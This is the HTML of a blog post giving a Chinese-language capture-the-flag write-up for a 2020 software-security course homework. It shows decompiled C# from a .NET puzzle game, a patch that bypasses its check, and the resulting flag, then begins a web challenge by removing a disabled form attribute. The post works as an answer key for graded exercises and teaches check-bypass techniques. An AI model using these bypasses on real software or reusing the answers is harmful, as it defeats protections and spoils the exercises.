@@ -1,0 +1,1633 @@
+<!DOCTYPE html>
+<html lang="en">
+    <!-- title -->
+
+
+
+
+<!-- keywords -->
+
+
+
+
+<head>
+    <meta name="description" content="早安是我拉ฅ(&#x3D;ˇωˇ&#x3D;)ฅ，今年又是助教拉，騙個流量，感恩。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2020::程式安全::HW0 Write-up">
+<meta property="og:image">
+<meta property="og:url" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/index.html">
+<meta property="og:site_name" content="NiNi&#39;s den">
+<meta property="og:description" content="早安是我拉ฅ(&#x3D;ˇωˇ&#x3D;)ฅ，今年又是助教拉，騙個流量，感恩。">
+<meta property="og:locale" content="tw">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev0.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev1.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev2.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev3.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev4.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web0.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web0-1.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web1.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web2.png">
+<meta property="og:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/webadmin.png">
+<meta property="article:published_time" content="2020-09-25T01:00:00.000Z">
+<meta property="article:modified_time" content="2020-09-29T12:00:01.228Z">
+<meta property="article:author" content="Terrynini">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="Cryptography">
+<meta property="article:tag" content="Pwn">
+<meta property="article:tag" content="Misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.terrynini.tw/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev0.png">
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="Terrynini">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="Terrynini">
+    
+    <meta name="keywords" content="NiNi's den,Terrynini">
+    
+    <meta name="description" content="">
+
+    <meta http-equiv="Cache-control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    
+    <title>2020::程式安全::HW0 Write-up · NiNi&#39;s Den</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s infinite;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= "/css/style.css?v=20180824" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= "/css/mobile.css?v=20180824" media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "//avatars2.githubusercontent.com/u/15998206?s=400&u=a9da7956108c466fb27481f535959a5dd8861d74&v=4" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-109652024-2"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-109652024-2');
+</script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >🦊Back to NiNi&#39;s Den</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">2020::程式安全::HW0 Write-up</a>
+            </div>
+    </div>
+    
+    
+    <a class="home-link" style="font-size: larger;" href=/>🦊Back to NiNi's Den</a>
+    
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style="
+
+
+
+
+
+
+
+height:50vh;
+">
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+    
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/DSC00041.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            2020::程式安全::HW0 Write-up
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                    <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Reverse">Reverse</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Web">Web</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Cryptography">Cryptography</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Pwn">Pwn</a>
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "Misc">Misc</a>
+    
+</div>
+                
+                
+                    <div class="post-intro-read">
+                        <span>Word count: <span class="post-count word-count">5k</span>Reading time: <span class="post-count reading-time">22 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2020/09/25</span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
+        
+    </div>
+</div>
+        <script>
+ 
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntros = document.getElementsByClassName('post-intros')[0]
+      if (postIntros) {
+        postIntros.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <p>早安是我拉ฅ(=ˇωˇ=)ฅ，今年又是助教拉，騙個流量，感恩。<a id="more"></a></p>
+<h1 id="Eekum-Bokum"><a href="#Eekum-Bokum" class="headerlink" title="Eekum Bokum"></a>Eekum Bokum</h1><h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>首先可以先跟程式互動一下掌握功能，總之看起來是一個 <a href="https://en.wikipedia.org/wiki/15_puzzle" target="_blank" rel="noopener">n-puzzle game</a>，值得一提的是，這個遊戲的 16 個方塊總共可以組成 $16!$ 個開局（可動塊不一定要在右下），其中洽有一半無解，因為我們遊戲過程中只能使用上下左右，組合出來的是一個交錯群，但這個起始盤面 16 號在右下且只有一次置換，不可能有解，所以別玩了，好好逆向好ㄇ：</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev0.png" class="">
+
+<p>總之先嘗試 file 它，可以發現他是 .Net assembly：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file</span> EekumBokum.exe</span><br><span class="line">EekumBokum.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, <span class="keyword">for</span> MS Windows</span><br></pre></td></tr></table></figure>
+
+<p>.Net 跟 JVM 類似，基本上就是一個執行 bytecode 的環境，bytecode 的好處除了方便移植到各個平台外，還非常好逆向(?)，這裡可以用 <a href="https://github.com/0xd4d/dnSpy" target="_blank" rel="noopener">dnSpy</a> 來幫助解題，匯入後長這樣：</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev1.png" class="">
+
+<p>總之 Program 是程式的入口點，他會叫起 Form1 也就是我們所看到的介面，直接打開來看，可以看得到建構式應該是在排遊戲盤面：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Form1</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.InitializeComponent();</span><br><span class="line">    <span class="keyword">this</span>.idxMovable = <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">this</span>.originalPicture.AddRange(<span class="keyword">new</span> Bitmap[]</span><br><span class="line">    &#123;</span><br><span class="line">        Resources.EekumBokum_1,</span><br><span class="line">        Resources.EekumBokum_2,</span><br><span class="line">        Resources.EekumBokum_3,</span><br><span class="line">        Resources.EekumBokum_4,</span><br><span class="line">        Resources.EekumBokum_5,</span><br><span class="line">        Resources.EekumBokum_6,</span><br><span class="line">        Resources.EekumBokum_7,</span><br><span class="line">        Resources.EekumBokum_8,</span><br><span class="line">        Resources.EekumBokum_9,</span><br><span class="line">        Resources.EekumBokum_10,</span><br><span class="line">        Resources.EekumBokum_11,</span><br><span class="line">        Resources.EekumBokum_12,</span><br><span class="line">        Resources.EekumBokum_13,</span><br><span class="line">        Resources.EekumBokum_14,</span><br><span class="line">        Resources.EekumBokum_15,</span><br><span class="line">        Resources.EekumBokum_16</span><br><span class="line">    &#125;);</span><br><span class="line">    List&lt;PictureBox&gt; listPitctureOrderedByName = (<span class="keyword">from</span> PictureBox c <span class="keyword">in</span> <span class="keyword">this</span>.groupBox1.Controls</span><br><span class="line">    <span class="keyword">orderby</span> Regex.Replace(c.Name, <span class="string">"\\d+"</span>, (Match n) =&gt; n.Value.PadLeft(<span class="number">4</span>, <span class="string">'0'</span>))</span><br><span class="line">    <span class="keyword">select</span> c).ToList&lt;PictureBox&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">16</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        listPitctureOrderedByName[i].Image = <span class="keyword">this</span>.originalPicture[i];</span><br><span class="line">    &#125;</span><br><span class="line">    listPitctureOrderedByName[<span class="number">13</span>].Image = <span class="keyword">this</span>.originalPicture[<span class="number">14</span>];</span><br><span class="line">    listPitctureOrderedByName[<span class="number">14</span>].Image = <span class="keyword">this</span>.originalPicture[<span class="number">13</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>繼續往下看可以發現 <code>samonCheck</code> 這個 method，可以發現在 method 的最後會生成一個跟 flag 相關的視窗，method 的中段做了一些不可描述的操作，看起來是解密，不過不需要急著看懂它，因為顯然是可以繞過的：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">samonCheck</span>(<span class="params">List&lt;PictureBox&gt; listPitcture</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    List&lt;<span class="keyword">byte</span>&gt; pwdl = <span class="keyword">new</span> List&lt;<span class="keyword">byte</span>&gt;();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">16</span>; p++)</span><br><span class="line">    &#123;</span><br><span class="line">        pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(<span class="number">66</span>, <span class="number">99</span>).R);</span><br><span class="line">        <span class="keyword">if</span> (!listPitcture[p].Image.Equals(<span class="keyword">this</span>.originalPicture[p]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 解密開始</span></span><br><span class="line">    <span class="keyword">byte</span>[] data = <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;<span class="number">250</span>,<span class="number">241</span>,<span class="number">107</span>,<span class="number">182</span>,<span class="number">244</span>,<span class="number">110</span>,<span class="number">21</span>,<span class="number">129</span>,<span class="number">17</span>,<span class="number">240</span>,<span class="number">155</span>,<span class="number">200</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">225</span>,<span class="number">110</span>,<span class="number">180</span>,<span class="number">224</span>,<span class="number">156</span>,<span class="number">194</span>,<span class="number">29</span>,<span class="number">106</span>,<span class="number">141</span>,<span class="number">216</span>,<span class="number">99</span>,<span class="number">58</span>,<span class="number">59</span>,<span class="number">191</span>,<span class="number">45</span>,<span class="number">227</span>,<span class="number">184</span>,<span class="number">221</span>,<span class="number">63</span>,<span class="number">139</span>,<span class="number">223</span>,<span class="number">232</span>,<span class="number">129</span>,<span class="number">201</span>,<span class="number">121</span>,<span class="number">62</span>,<span class="number">164</span>,<span class="number">113</span>,<span class="number">247</span>,<span class="number">230</span>,<span class="number">67</span>,<span class="number">108</span>,<span class="number">182</span>,<span class="number">231</span>&#125;;</span><br><span class="line">    <span class="keyword">byte</span>[] pwd = pwdl.ToArray();</span><br><span class="line">    <span class="keyword">int</span>[] key = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">int</span>[] box = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">256</span>];</span><br><span class="line">    <span class="keyword">byte</span>[] cipher = <span class="keyword">new</span> <span class="keyword">byte</span>[data.Length];</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        key[i] = (<span class="keyword">int</span>)pwd[i % pwd.Length];</span><br><span class="line">        box[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> j;</span><br><span class="line">    <span class="keyword">for</span> (i = (j = <span class="number">0</span>); i &lt; <span class="number">256</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        j = (j + box[i] + key[i]) % <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp = box[i];</span><br><span class="line">        box[i] = box[j];</span><br><span class="line">        box[j] = tmp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> a;</span><br><span class="line">    j = (a = (i = <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">while</span> (i &lt; data.Length)</span><br><span class="line">    &#123;</span><br><span class="line">        a++;</span><br><span class="line">        a %= <span class="number">256</span>;</span><br><span class="line">        j += box[a];</span><br><span class="line">        j %= <span class="number">256</span>;</span><br><span class="line">        <span class="keyword">int</span> tmp = box[a];</span><br><span class="line">        box[a] = box[j];</span><br><span class="line">        box[j] = tmp;</span><br><span class="line">        <span class="keyword">int</span> k = box[(box[a] + box[j]) % <span class="number">256</span>];</span><br><span class="line">        cipher[i] = (<span class="keyword">byte</span>)((<span class="keyword">int</span>)data[i] ^ k);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//解密結束</span></span><br><span class="line">    MessageBox.Show(<span class="string">"this is your flag\n"</span> + Encoding.ASCII.GetString(cipher));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>關鍵的程式碼在 54 行開始的地方，假設當前遊戲盤面個元素都跟<code>originalPicture</code>一樣的話，就把每個方塊中的圖片位於座標 (66.99) 的 pixel 拿出來，做為後半段解密 flag 的 key：</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">List&lt;<span class="keyword">byte</span>&gt; pwdl = <span class="keyword">new</span> List&lt;<span class="keyword">byte</span>&gt;();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; p &lt; <span class="number">16</span>; p++)</span><br><span class="line">&#123;</span><br><span class="line">    pwdl.Add(((Bitmap)listPitcture[p].Image).GetPixel(<span class="number">66</span>, <span class="number">99</span>).R);</span><br><span class="line">    <span class="keyword">if</span> (!listPitcture[p].Image.Equals(<span class="keyword">this</span>.originalPicture[p]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>這裡直覺的作法應該就是把圖片抽出來，拿出對應座標的 pixel，然後解密，但由於 .Net 非常好還原，dnSpy 還原出來的 code 基本上跟 source code 沒差別，所以我們其實可以重新 compile 他就好了，在 Form1 的建構子上面點 Edit Method：</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev2.png" class="">
+
+<p>直接讓遊戲開局的盤面變成走一步可解就好了，直接修改建構子然後點 Compile，之後存檔就好了：</p>
+<figure class="highlight csharp"><table><tr><td class="code"><pre><span class="line">listPitctureOrderedByName[<span class="number">13</span>].Image = <span class="keyword">this</span>.originalPicture[<span class="number">14</span>];</span><br><span class="line">listPitctureOrderedByName[<span class="number">14</span>].Image = <span class="keyword">this</span>.originalPicture[<span class="number">13</span>];</span><br><span class="line"><span class="comment">//把上面兩行改成下面兩行</span></span><br><span class="line">listPitctureOrderedByName[<span class="number">14</span>].Image = <span class="keyword">this</span>.originalPicture[<span class="number">15</span>];</span><br><span class="line">listPitctureOrderedByName[<span class="number">15</span>].Image = <span class="keyword">this</span>.originalPicture[<span class="number">14</span>];</span><br></pre></td></tr></table></figure>
+
+<h2 id="Exploit-or-just-move"><a href="#Exploit-or-just-move" class="headerlink" title="Exploit (or just move)"></a>Exploit (or just move)</h2><p>重新執行修改過後完成 compile 的程式：</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev3.png" class="">
+
+<p>(按一下左鍵)</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/rev4.png" class="">
+
+<p>flag: <code>flag{NANI_KORE?(=.=)EEKUM_BOKUM(=^=)EEKUM_BOKUM}</code></p>
+<h1 id="owoHub"><a href="#owoHub" class="headerlink" title="owoHub"></a>owoHub</h1><h2 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h2><p>題目的介面很簡單，可以輸入 username 跟選擇 I am cute/not cute，簡單跟題目互動來掌握一下有什麼功能。</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web0.png" class="">
+
+<p>如果勾選 I am not cute，網站會顯示一堆 Stop</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web0-1.png" class="">
+<p>這裡的 I am cute 沒辦法選擇，但這只是 html tag 而已，最快的方法就是用開發者工具拔掉 attribute</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web1.png" class="">
+<p>直接拿掉，之後就能勾選了</p>
+<img src="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web2.png" class="">
+
+<p>進來後有一堆可愛小吉，雖然對於我來說比 flag 讚多了，但還是遵循世俗的價值，繼續尋找 flag</p>
+
+
+<p>接下來看一下題目提供的 <a href="https://owohub.zoolab.org/source" target="_blank" rel="noopener">source code</a> 看看有沒有有趣的資訊（<a href="/tw/2020-%E7%A8%8B%E5%BC%8F%E5%AE%89%E5%85%A8-HW0-Write-up/web-source.txt" title="備份">備份</a>)，從前幾行知道這是用 express 寫的網站（寫這種題目卡住的話，就不要一直看螢幕了，架一個一樣的服務戳戳看），而且 authServer 有我們想要的 flag，但從 12 行可以知道這個 server 只接受 local 的連線，我們只能間接跟他互動，不過現在知道要拿到 flag 的條件是成為 admin 而且 <code>givemeflag === &quot;yes&quot;</code></p>
